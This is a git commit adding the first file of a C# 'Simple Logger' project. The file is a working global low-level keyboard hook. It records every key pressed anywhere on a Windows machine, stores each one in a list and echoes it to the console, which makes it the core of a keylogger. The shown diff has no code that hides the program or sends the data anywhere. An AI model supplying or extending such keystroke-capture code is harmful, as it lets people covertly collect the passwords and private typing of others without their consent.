33049c9331018c7f1dd17905688dd677330ea913
Josh de Wet <joshdwet@gmail.com>
2017-12-14 22:58:57 +1300

    First Commit
    Low level keyboard hooking is working and provides no lag to the computer whilst the hook is active.

---
+++ Simple Logger/Hook.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace Simple_Logger
+{
+    public class Hook
+    {
+        // Variable definitions
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+
+        public static IntPtr _hookId = IntPtr.Zero;
+
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        public static LowLevelKeyboardProc Proc = HookCallback;
+
+        // Used to convert virtual key codes to readable strings
+
+        private static readonly KeysConverter Converter = new KeysConverter();
+
+        // DLL Imports
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        // Registers hook with windows api
+
+        public static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (var curProcess = Process.GetCurrentProcess())
+            using (var curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        // Process the key stroke
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                var vkCode = Marshal.ReadInt32(lParam);
+                Logger.Keys.Add(Converter.ConvertToString(vkCode)?.ToLower());
+                Console.WriteLine(Converter.ConvertToString(vkCode)?.ToLower());
+            }
+
+            return CallNextHookEx(_hookId, nCode, wParam, lParam);
+        }
+    }
+}
